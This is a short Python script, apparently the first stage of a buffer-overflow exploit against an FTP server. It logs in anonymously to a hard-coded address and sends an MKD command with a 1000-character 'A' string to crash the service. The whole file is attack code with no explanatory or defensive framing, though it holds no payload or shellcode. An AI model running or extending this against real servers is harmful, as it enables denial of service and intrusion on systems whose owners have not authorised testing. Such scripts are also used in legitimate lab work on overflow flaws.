#!/usr/bin/python 
import socket
import sys

evil = "A"*1000 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('11.11.11.6',21))
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD ' + evil + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close
